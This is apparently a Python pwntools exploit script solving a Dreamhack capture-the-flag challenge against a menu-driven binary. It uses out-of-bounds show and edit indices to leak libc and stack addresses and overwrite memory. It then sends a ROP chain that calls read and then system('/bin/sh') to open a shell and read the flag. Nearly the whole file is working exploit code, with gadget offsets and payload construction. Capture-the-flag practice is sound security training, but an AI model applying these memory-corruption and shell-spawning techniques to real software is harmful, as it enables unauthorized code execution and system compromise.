#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 17232
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001352

            # show
            brva 0x000000000000144E

            # update
            brva 0x00000000000014C9
            brva 0x00000000000015E1
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'size: ', str(size))
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'index: ', str(idx))

def edit(idx, size, data):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'index: ', str(idx))
    p.sendlineafter(b'size: ', str(size))
    p.sendafter(b'data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', str(4))
    p.sendlineafter(b'index: ', str(idx))

# VARIABLE


# PAYLOAD
for i in range(10):
    add(0x28, f'{i}'.encode()*0x28)
show(-47)
p.recv(8*7)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - libc.sym._IO_2_1_stdin_
log.info("Libc base: " + hex(libc.address))
p.recv(8)
stack_leak = u64(p.recv(8))
log.info("Stack leak: " + hex(stack_leak))
pop_rdi = 0x000000000010f75b + libc.address
ret = pop_rdi + 1
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]
pop_rdx = 0x0000000000162e3a + libc.address
pop_rax = 0x00000000000dd237 + libc.address
pop_rsi = 0x0000000000110a4d + libc.address

payload = flat(
    b'a'*0x10,
    pop_rsi,
    stack_leak + 0x810,
    libc.sym.read
    )
edit(-2, 0x28, payload)

payload = flat(
    pop_rdi,
    bin_sh,
    system
    )
p.send(payload)

p.sendline(b'cat flag')

p.interactive()